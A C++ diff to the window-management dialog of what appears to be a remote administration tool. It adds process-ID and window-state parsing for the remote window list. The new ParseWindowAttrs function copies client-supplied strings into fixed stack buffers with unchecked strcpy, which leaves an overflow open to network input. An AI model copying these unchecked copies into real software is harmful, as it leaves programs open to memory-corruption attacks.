@@ -11,7 +11,7 @@
 
 typedef struct ItemData {
     DWORD ID;
-    CString Data[3];
+    CString Data[4];
     CString GetData(int index)const
     {
         return Data[index];
@@ -84,11 +84,73 @@ BOOL CSystemDlg::OnInitDialog()
         m_ControlList.InsertColumn(0, "句柄", LVCFMT_LEFT, 80);
         m_ControlList.InsertColumn(1, "窗口名称", LVCFMT_LEFT, 420);
         m_ControlList.InsertColumn(2, "窗口状态", LVCFMT_LEFT, 200);
+        m_ControlList.InsertColumn(3, "所属进程ID", LVCFMT_LEFT, 100);
         ShowWindowsList();
     }
 
     return TRUE;  // return TRUE unless you set the focus to a control
     // 异常: OCX 属性页应返回 FALSE
+}
+
+// 窗口属性结构体
+struct WindowAttrs {
+    char szTitle[1024];     // 窗口标题
+    char szStatus[32];      // 状态: normal/minimized/maximized/hidden
+    DWORD dwPid;            // 所属进程ID
+    int nReserved1;         // 保留字段1
+    int nReserved2;         // 保留字段2
+};
+
+// 从末尾解析窗口属性（支持标题含 | 字符, 兼容老客户端）
+BOOL ParseWindowAttrs(const char* szData, WindowAttrs* attrs) {
+    if (szData == NULL || attrs == NULL)
+        return FALSE;
+
+    // 初始化默认值
+    memset(attrs, 0, sizeof(WindowAttrs));
+    strcpy(attrs->szStatus, "normal");
+    attrs->dwPid = 0;
+    attrs->nReserved1 = 0;
+    attrs->nReserved2 = 0;
+
+    char temp[1200];
+    strcpy(temp, szData);
+    int len = strlen(temp);
+
+    // 从末尾找4个 |
+    int pipePos[4] = { -1, -1, -1, -1 };
+    int pipeCount = 0;
+
+    for (int i = len - 1; i >= 0 && pipeCount < 4; i--) {
+        if (temp[i] == '|') {
+            pipePos[pipeCount++] = i;
+        }
+    }
+
+    // ========== 兼容老客户端 ==========
+    if (pipeCount < 4) {
+        // 老格式：只有标题，没有属性
+        strcpy(attrs->szTitle, szData);
+        return TRUE;  // 仍返回成功，使用默认值
+    }
+    // ========== 兼容结束 ==========
+
+    // 新格式：从末尾往前解析
+    attrs->nReserved2 = atoi(temp + pipePos[0] + 1);
+    temp[pipePos[0]] = '\0';
+
+    attrs->nReserved1 = atoi(temp + pipePos[1] + 1);
+    temp[pipePos[1]] = '\0';
+
+    attrs->dwPid = atol(temp + pipePos[2] + 1);
+    temp[pipePos[2]] = '\0';
+
+    strcpy(attrs->szStatus, temp + pipePos[3] + 1);
+    temp[pipePos[3]] = '\0';
+
+    strcpy(attrs->szTitle, temp);
+
+    return TRUE;
 }
 
 void CSystemDlg::ShowWindowsList(void)
@@ -105,12 +167,16 @@ void CSystemDlg::ShowWindowsList(void)
     for ( i = 0; dwOffset <m_ContextObject->InDeCompressedBuffer.GetBufferLength() - 1; ++i) {
         LPDWORD	lpPID = LPDWORD(szBuffer + dwOffset);   //窗口句柄
         szTitle = (char *)szBuffer + dwOffset + sizeof(DWORD);   //窗口标题
+        WindowAttrs attrs = {};
+        ParseWindowAttrs(szTitle, &attrs);
         str.Format("%5u", *lpPID);
-        m_ControlList.InsertItem(i, str);
-        m_ControlList.SetItemText(i, 1, szTitle);
-        m_ControlList.SetItemText(i, 2, "显示"); //(d) 将窗口状态显示为 "显示"
+        CString pidStr = attrs.dwPid ? std::to_string(attrs.dwPid).c_str() : "N/A";
+        m_ControlList.InsertItem(i, str);                   // 句柄
+        m_ControlList.SetItemText(i, 1, attrs.szTitle);     // 标题
+        m_ControlList.SetItemText(i, 2, attrs.szStatus);    // 窗口状态
+		m_ControlList.SetItemText(i, 3, pidStr);            // 所属进程ID
         // ItemData 为窗口句柄
-        auto data = new ItemData{ *lpPID, {str, szTitle,"显示"} };
+        auto data = new ItemData{ *lpPID, {str, attrs.szTitle, attrs.szStatus, pidStr} };
         m_ControlList.SetItemData(i, (DWORD_PTR)data);  //(d)
         dwOffset += sizeof(DWORD) + lstrlen(szTitle) + 1;
     }
@@ -358,7 +424,6 @@ void CSystemDlg::OnWlistClose()
         DWORD hwnd = data->ID; //得到窗口的句柄一同发送  4   djfkdfj  dkfjf  4
         memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));   //1 4
         m_ContextObject->Send2Client(lpMsgBuf, sizeof(lpMsgBuf));
-
     }
 }
 
@@ -375,7 +440,7 @@ void CSystemDlg::OnWlistHide()
         lpMsgBuf[0]=CMD_WINDOW_TEST;             //窗口处理数据头
         auto data = (ItemData*)pListCtrl->GetItemData(nItem);
         DWORD hwnd = data->ID;  //得到窗口的句柄一同发送
-        pListCtrl->SetItemText(nItem,2,"隐藏");      //注意这时将列表中的显示状态为"隐藏"
+        pListCtrl->SetItemText(nItem,2,"hidden");      //注意这时将列表中的显示状态为"隐藏"
         //这样在删除列表条目时就不删除该项了 如果删除该项窗口句柄会丢失 就永远也不能显示了
         memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));      //得到窗口的句柄一同发送
         DWORD dHow=SW_HIDE;                          //窗口处理参数 0
@@ -397,7 +462,7 @@ void CSystemDlg::OnWlistRecover()
         lpMsgBuf[0]= CMD_WINDOW_TEST;
         auto data = (ItemData*)pListCtrl->GetItemData(nItem);
         DWORD hwnd = data->ID;
-        pListCtrl->SetItemText(nItem,2,"显示");
+        pListCtrl->SetItemText(nItem,2,"normal");
         memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
         DWORD dHow=SW_NORMAL;
         memcpy(lpMsgBuf+1+sizeof(hwnd),&dHow,sizeof(DWORD));
@@ -418,7 +483,7 @@ void CSystemDlg::OnWlistMax()
         lpMsgBuf[0]= CMD_WINDOW_TEST;
         auto data = (ItemData*)pListCtrl->GetItemData(nItem);
         DWORD hwnd = data->ID;
-        pListCtrl->SetItemText(nItem,2,"显示");
+        pListCtrl->SetItemText(nItem,2,"maximized");
         memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
         DWORD dHow=SW_MAXIMIZE;
         memcpy(lpMsgBuf+1+sizeof(hwnd),&dHow,sizeof(DWORD));
@@ -439,7 +504,7 @@ void CSystemDlg::OnWlistMin()
         lpMsgBuf[0]= CMD_WINDOW_TEST;
         auto data = (ItemData*)pListCtrl->GetItemData(nItem);
         DWORD hwnd = data->ID;
-        pListCtrl->SetItemText(nItem,2,"显示");
+        pListCtrl->SetItemText(nItem,2,"minimized");
         memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
         DWORD dHow=SW_MINIMIZE;
         memcpy(lpMsgBuf+1+sizeof(hwnd),&dHow,sizeof(DWORD));
